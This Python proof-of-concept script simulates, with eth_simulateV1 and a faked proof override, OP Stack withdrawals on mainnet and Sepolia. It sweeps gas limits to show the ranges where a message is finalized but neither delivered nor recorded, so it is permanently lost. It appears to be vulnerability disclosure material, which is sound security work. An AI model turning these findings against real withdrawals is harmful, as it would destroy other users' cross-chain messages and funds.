# PoC 2: an OP Stack withdrawal message whose target runs out of gas is
# normally recorded as failed so anyone can replay it. On Glamsterdam,
# recording the failure costs more than the messenger's 40,000 gas reserve,
# so at many gas limits the message is finalized but neither delivered nor
# recorded, and can never be replayed.
#
# Uses the real OP L1 contracts on Glamsterdam Sepolia and on Ethereum mainnet,
# with eth_simulateV1. The withdrawal proof is placed with a state override
# (as if it had been proven a week ago); everything after that is the real
# OptimismPortal2.finalizeWithdrawalTransaction and L1CrossDomainMessenger.relayMessage.
# The message target is a contract that burns all gas it gets (code 0xfe).
import json, subprocess
from concurrent.futures import ThreadPoolExecutor

MAINNET, SEPOLIA = 'https://ethereum-rpc.publicnode.com', 'https://ethereum-sepolia-rpc.publicnode.com'
CHAINS = {  # L1 RPC, L1CrossDomainMessenger proxy
    'Base on mainnet': (MAINNET, '0x866E82a600A1414e583f7F13623F1aC5d58b0Afa'),
    'Base Sepolia on Glamsterdam Sepolia': (SEPOLIA, '0xC34855F4De64F1840e5686e64278da901e261f20'),
    'OP mainnet on mainnet': (MAINNET, '0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1'),
    'OP Sepolia on Glamsterdam Sepolia': (SEPOLIA, '0x58Cc85b8D04EA49cC6DBd3CbFFd00B4B8D6cb3ef'),
}
L2_MESSENGER = '0x4200000000000000000000000000000000000007'
TARGET = '0x00000000000000000000000000000000000dEAD0'  # code 0xfe: burns all gas
SENDER = '0x00000000000000000000000000000000000B0B01'  # any L2 sender
CALLER = '0x00000000000000000000000000000000000B0B02'  # whoever finalizes on L1
MIN_GAS = 200_000

cast = lambda *a: subprocess.check_output(['cast', *map(str, a)], text=True).strip()
word = lambda r: int(r[2:66], 16)
addr = lambda r: '0x' + r[-40:]

def rpc(url, method, params):
    for _ in range(5):
        try:
            x = json.loads(subprocess.check_output(['curl', '-s', '-m', '60', '-H', 'content-type: application/json', '-d', json.dumps({'jsonrpc': '2.0', 'id': 1, 'method': method, 'params': params}), url]))
            if 'result' in x: return x['result']
        except Exception: pass
    raise SystemExit(f'RPC failed: {method} {url}')

def sweep(name, url, messenger, gases):
    view = lambda to, sig, *a: rpc(url, 'eth_call', [{'to': to, 'data': cast('calldata', sig, *a)}, 'latest'])
    portal = addr(view(messenger, 'portal()'))
    registry = addr(view(portal, 'anchorStateRegistry()'))
    game = addr(view(registry, 'anchorGame()'))
    delay = word(view(portal, 'proofMaturityDelaySeconds()'))
    now = int(rpc(url, 'eth_getBlockByNumber', ['latest', False])['timestamp'], 16)
    proven_at = max(int(view(game, 'createdAt()'), 16) + 1, now - delay - 3600)
    sim_time = max(now + 24, proven_at + delay + 60)

    # The L2 message: relayMessage on the L1 messenger, sent by the L2 messenger.
    relay = cast('calldata', 'relayMessage(uint256,address,address,uint256,uint256,bytes)', (1 << 240) | 1, SENDER, TARGET, 0, MIN_GAS, '0x')
    msg_hash = cast('keccak', relay)
    w_nonce = (1 << 240) | 2
    w_gas = word(view(messenger, 'baseGas(bytes,uint32)', '0x', MIN_GAS))
    w_hash = cast('keccak', cast('abi-encode', 'f(uint256,address,address,uint256,uint256,bytes)', w_nonce, L2_MESSENGER, messenger, 0, w_gas, relay))
    finalize = cast('calldata', 'finalizeWithdrawalTransaction((uint256,address,address,uint256,uint256,bytes))', f'({w_nonce},{L2_MESSENGER},{messenger},0,{w_gas},{relay})')
    # provenWithdrawals[w_hash][CALLER] = (game, proven_at), mapping at slot 57
    proof_slot = cast('keccak', cast('abi-encode', 'f(address,bytes32)', CALLER, cast('keccak', cast('abi-encode', 'f(bytes32,uint256)', w_hash, 57))))
    proof = '0x' + f'{proven_at:024x}' + game[2:].lower()
    reads = [(portal, cast('calldata', 'finalizedWithdrawals(bytes32)', w_hash)),
             (messenger, cast('calldata', 'successfulMessages(bytes32)', msg_hash)),
             (messenger, cast('calldata', 'failedMessages(bytes32)', msg_hash))]

    def run(gas):
        r = rpc(url, 'eth_simulateV1', [{'blockStateCalls': [
            {'stateOverrides': {portal: {'stateDiff': {proof_slot: proof}}, TARGET: {'code': '0xfe'}, CALLER: {'balance': hex(10**20)}},
             'blockOverrides': {'time': hex(sim_time)},
             'calls': [{'from': CALLER, 'to': portal, 'data': finalize, 'gas': hex(gas)}]},
            {'blockOverrides': {'time': hex(sim_time + 12)},
             'calls': [{'from': CALLER, 'to': t, 'data': d} for t, d in reads]}]}, 'latest'])
        finalized, delivered, recorded = (int(c['returnData'], 16) for c in r[1]['calls'])
        if not finalized: return 'tx reverts, try again later'
        if delivered: return 'delivered'
        if recorded: return 'recorded as failed, anyone can replay it'
        return 'LOST: finalized, not delivered, not recorded'

    with ThreadPoolExecutor(8) as pool: outs = list(pool.map(run, gases))
    rows, prev = [], None
    for g, out in zip(gases, outs):
        if out != prev: rows.append([out, g, g]); prev = out
        else: rows[-1][2] = g
    version = cast('abi-decode', 'f()(string)', view(messenger, 'version()'))
    print(f'\n{name}, messenger {version}: OptimismPortal2.finalizeWithdrawalTransaction at gas limits {gases[0]:,} to {gases[-1]:,}')
    for out, a, b in rows: print(f'  {a:>10,} to {b:>10,}  {out}')

gases = list(range(500_000, 2_000_000, 25_000)) + list(range(2_000_000, 10_000_001, 250_000))
for name, (url, messenger) in CHAINS.items(): sweep(name, url, messenger, gases)
